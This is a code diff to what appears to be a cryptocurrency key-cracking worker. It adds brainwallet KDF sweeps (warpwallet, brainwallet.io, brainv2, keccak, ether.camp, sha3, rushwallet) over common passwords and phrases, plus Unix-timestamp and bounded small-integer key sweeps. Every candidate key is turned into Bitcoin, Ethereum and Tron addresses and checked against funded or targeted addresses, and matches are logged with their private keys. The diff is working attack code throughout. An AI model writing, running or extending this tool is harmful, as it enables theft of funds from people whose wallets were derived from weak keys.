@@ -160,6 +160,12 @@ let paused = false;
 const workerCount = Math.max(1, Number((workerData && workerData.workerCount)) || 4);
 let smallIntNext = (Number(workerData && workerData.smallIntCursor) || 0) + workerId + 1;
 const smallIntStep = workerCount;
+// Range-bound the integer sweep (upgrade: search keys N in [RWS_SWEEP_START, RWS_SWEEP_END))
+const sweepRangeStart = Number(process.env.RWS_SWEEP_START || 1);
+const sweepRangeEnd = process.env.RWS_SWEEP_END ? Number(process.env.RWS_SWEEP_END) : null;
+if (process.env.RWS_SWEEP_START && smallIntNext < sweepRangeStart) {
+  smallIntNext = sweepRangeStart + workerId;
+}
 
 if (parentPort) {
   parentPort.on('message', msg => {
@@ -250,6 +256,7 @@ function runSmallIntSweep(count = 24) {
   let checked = 0;
   for (let i = 0; i < count; i++) {
     const n = smallIntNext;
+    if (sweepRangeEnd !== null && n >= sweepRangeEnd) break;
     smallIntNext += smallIntStep;
     const privKey = Buffer.from(BigInt(n).toString(16).padStart(64, '0'), 'hex');
     const privHex = privKey.toString('hex');
@@ -279,6 +286,177 @@ function runSmallIntSweep(count = 24) {
     }
   }
   return { checked, hits };
+}
+
+// ============================================================================
+// KDF-BRAINWALLET FAMILIES (brainflayer-compatible) + TIMESTAMP SWEEP
+// Params verified against ryancdotorg/brainflayer algo/*.c + floodyberry/scrypt-jane:
+//   warp   : scrypt(pw+0x01, salt+0x01, N=2^18, r=8, p=1) XOR pbkdf2-hmac-sha256(pw+0x02, salt+0x02, 2^16 iters)
+//   bwio   : sha256( hex( scrypt(pw, salt, N=2^18, r=8, p=1) ) )   (brainwallet.io)
+//   brainv2: 3-stage scrypt (N=2^14,r=1,p=64 / 256x N=2^16,r=1,p=64 / N=2^14,r=1,p=64) -> sha256(hex16)
+//   keccak : keccak256(pw)            (legacy Ethereum brainwallet tools)
+//   camp2  : keccak256 x 2031         (ether.camp)
+//   sha3   : nist-sha3-256(pw)
+//   rush   : sha256( hex( sha256(pw) ) )   (rushwallet protected, empty fragment)
+// ============================================================================
+const KDF_SCRYPT_OPTS = { N: 262144, r: 8, p: 1, maxmem: 512 * 1024 * 1024 };
+const KDF_BV2_OPTS_A = { N: 16384, r: 1, p: 64, maxmem: 64 * 1024 * 1024 };
+const KDF_BV2_OPTS_B = { N: 65536, r: 1, p: 64, maxmem: 128 * 1024 * 1024 };
+
+function kdfWarpPriv(passBuf, saltBuf) {
+  const b1 = Buffer.from([1]);
+  const b2 = Buffer.from([2]);
+  const seed1 = crypto.scryptSync(Buffer.concat([passBuf, b1]), Buffer.concat([saltBuf, b1]), 32, KDF_SCRYPT_OPTS);
+  const seed2 = crypto.pbkdf2Sync(Buffer.concat([passBuf, b2]), Buffer.concat([saltBuf, b2]), 65536, 32, 'sha256');
+  const out = Buffer.alloc(32);
+  for (let i = 0; i < 32; i++) out[i] = seed1[i] ^ seed2[i];
+  return out;
+}
+function kdfBwioPriv(passBuf, saltBuf) {
+  const seed1 = crypto.scryptSync(passBuf, saltBuf, 32, KDF_SCRYPT_OPTS);
+  return crypto.createHash('sha256').update(seed1.toString('hex')).digest();
+}
+function kdfBrainV2Priv(passBuf, saltBuf) {
+  const key1 = crypto.scryptSync(passBuf, saltBuf, 16384, KDF_BV2_OPTS_A);
+  const key2 = Buffer.alloc(8192);
+  for (let t = 0; t < 256; t++) {
+    const outT = crypto.scryptSync(key1.subarray(t * 64, t * 64 + 32), key1.subarray(t * 64 + 32, t * 64 + 64), 32, KDF_BV2_OPTS_B);
+    outT.copy(key2, t * 32);
+  }
+  const key3 = crypto.scryptSync(passBuf, key2, 16, KDF_BV2_OPTS_A);
+  return crypto.createHash('sha256').update(key3.toString('hex')).digest();
+}
+
+const KDF_FAST_PHRASES = [
+  'password', '123456', '123456789', '12345678', '12345', 'qwerty', 'abc123', 'password1',
+  'letmein', 'iloveyou', 'monkey', 'dragon', 'bitcoin', 'satoshi', 'nakamoto', 'trustno1',
+  'master', 'secret', 'passw0rd', 'admin', 'changeme', 'hello', 'freedom', 'whatever',
+  'correct horse battery staple', 'to be or not to be', 'the quick brown fox',
+  'in the beginning', 'genesis block', 'all rights reserved', 'i am satoshi nakamoto',
+  'deadbeef', 'hunter2', 'test', 'test123', 'root', 'guest', 'default', 'privatekey',
+  'wallet', 'crypto', 'ethereum', 'litecoin', 'dogecoin', 'moon', 'hodl', 'lambo'
+];
+const KDF_SLOW_PHRASES = [
+  'password', 'satoshi', 'bitcoin', 'correct horse battery staple',
+  '123456', 'iloveyou', 'nakamoto', 'i am satoshi nakamoto', 'trustno1', 'qwerty'
+];
+
+const kdfFastList = (() => {
+  const seen = new Set();
+  const out = [];
+  for (const p of [...KDF_FAST_PHRASES, ...(eng.WORDLIST || [])]) {
+    if (!seen.has(p)) { seen.add(p); out.push(Buffer.from(p, 'utf8')); }
+  }
+  return out;
+})();
+const kdfSlowList = KDF_SLOW_PHRASES.map(p => Buffer.from(p, 'utf8'));
+let kdfFastCursor = workerId;
+let kdfSlowCursor = workerId;
+let tsCursor = (Number(process.env.RWS_TS_START) || 1231006505) + workerId; // 2009-01-03T18:15:05Z
+const tsEnd = Number(process.env.RWS_TS_END) || 1893456000; // 2030-01-01
+
+function screenKdfPriv(privKey, label, passDisplay, hits, stats) {
+  const privHex = privKey.toString('hex');
+  if (!privKey.length || privKey.length > 32) return;
+  if (!tryClaimUniqueCandidate(privHex, 'kdf:')) return;
+  stats.checked++;
+  const fast = eng.deriveUltraFastScreener(privKey);
+  if (
+    isTargetOrFundedHit(fast.btcLegacy) ||
+    isTargetOrFundedHit(fast.btcLegacyUncompressed) ||
+    isTargetOrFundedHit(fast.btcNestedSegwit) ||
+    isTargetOrFundedHit(fast.btcSegwit) ||
+    isTargetOrFundedHit(fast.ethAddressLower) ||
+    isTargetOrFundedHit(fast.trxAddress)
+  ) {
+    const fullAddrs = eng.deriveAddressesFromPrivKey(privKey, true);
+    hits.push({
+      source: `Worker #${workerId + 1} • KDF Family (${label})`,
+      vectorKey: 'kdf',
+      feedType: 'Private',
+      phraseType: `KDF ${label}`,
+      input: `0x${privHex}`,
+      kdfPassphrase: passDisplay,
+      brainArm: label,
+      priorityHit: true,
+      ...fullAddrs
+    });
+  }
+}
+
+function runKdfFamilySweep(round) {
+  const hits = [];
+  const stats = { checked: 0 };
+  // Fast hash-based KDFs: 2 passphrases per round across 5 variants (camp2 throttled - 2031 keccaks)
+  for (let i = 0; i < 2; i++) {
+    const passBuf = kdfFastList[kdfFastCursor++ % kdfFastList.length];
+    const passDisplay = passBuf.toString('utf8');
+    const variants = [
+      ['keccak256', eng.keccak256(passBuf)],
+      ['sha3-256', crypto.createHash('sha3-256').update(passBuf).digest()],
+      ['rushwallet', crypto.createHash('sha256').update(crypto.createHash('sha256').update(passBuf).digest('hex')).digest()]
+    ];
+    if (((kdfFastCursor + i) % 5) === 0) {
+      let h = eng.keccak256(passBuf);
+      for (let r = 1; r < 2031; r++) h = eng.keccak256(h);
+      variants.push(['camp2-2031', h]);
+    }
+    for (const [label, priv] of variants) screenKdfPriv(priv, label, passDisplay, hits, stats);
+  }
+  // Slow scrypt KDFs (warp/bwio/brainv2): one passphrase every 25 rounds
+  if (round % 25 === 0) {
+    const passBuf = kdfSlowList[kdfSlowCursor++ % kdfSlowList.length];
+    const passDisplay = passBuf.toString('utf8');
+    const saltBuf = Buffer.alloc(0);
+    try {
+      screenKdfPriv(kdfWarpPriv(passBuf, saltBuf), 'warpwallet', passDisplay, hits, stats);
+      screenKdfPriv(kdfBwioPriv(passBuf, saltBuf), 'brainwallet.io', passDisplay, hits, stats);
+      screenKdfPriv(kdfBrainV2Priv(passBuf, saltBuf), 'brainv2', passDisplay, hits, stats);
+    } catch (_) { /* scrypt memory pressure - skip this round */ }
+  }
+  return { hits, checked: stats.checked };
+}
+
+function runTimestampSweep(count = 12) {
+  const hits = [];
+  let checked = 0;
+  for (let i = 0; i < count && tsCursor < tsEnd; i++) {
+    const ts = tsCursor += workerCount ? workerCount : 1;
+    if (ts >= tsEnd) break;
+    const candidates = [
+      Buffer.from(BigInt(ts).toString(16).padStart(64, '0'), 'hex'),
+      crypto.createHash('sha256').update(String(ts)).digest(),
+      crypto.createHash('sha256').update(new Date(ts * 1000).toISOString()).digest()
+    ];
+    for (const privKey of candidates) {
+      const privHex = privKey.toString('hex');
+      if (!tryClaimUniqueCandidate(privHex, 'ts:')) continue;
+      checked++;
+      const fast = eng.deriveUltraFastScreener(privKey);
+      if (
+        isTargetOrFundedHit(fast.btcLegacy) ||
+        isTargetOrFundedHit(fast.btcLegacyUncompressed) ||
+        isTargetOrFundedHit(fast.btcNestedSegwit) ||
+        isTargetOrFundedHit(fast.btcSegwit) ||
+        isTargetOrFundedHit(fast.ethAddressLower) ||
+        isTargetOrFundedHit(fast.trxAddress)
+      ) {
+        const fullAddrs = eng.deriveAddressesFromPrivKey(privKey, true);
+        hits.push({
+          source: `Worker #${workerId + 1} • Timestamp Sweep (${ts})`,
+          vectorKey: 'timestamp',
+          feedType: 'Private',
+          phraseType: `Unix-Time Key ${ts}`,
+          input: `0x${privHex}`,
+          brainArm: 'TimestampSweep',
+          priorityHit: true,
+          timestampKeyNumber: ts,
+          ...fullAddrs
+        });
+      }
+    }
+  }
+  return { hits, checked };
 }
 
 function generateWorkerCandidate() {
@@ -475,7 +653,11 @@ function workerLoop() {
     const { screenedWallets, burstHits } = runUltraFastHardwareBurst(32);
     const smallInt = runSmallIntSweep(24);
     if (smallInt.hits.length) burstHits.push(...smallInt.hits);
-    const screenedTotal = screenedWallets + smallInt.checked;
+    const kdf = runKdfFamilySweep(localCounter);
+    if (kdf.hits.length) burstHits.push(...kdf.hits);
+    const tsSweep = runTimestampSweep(12);
+    if (tsSweep.hits.length) burstHits.push(...tsSweep.hits);
+    const screenedTotal = screenedWallets + smallInt.checked + kdf.checked + tsSweep.checked;
 
     const batch = [];
     let attempts = 0;
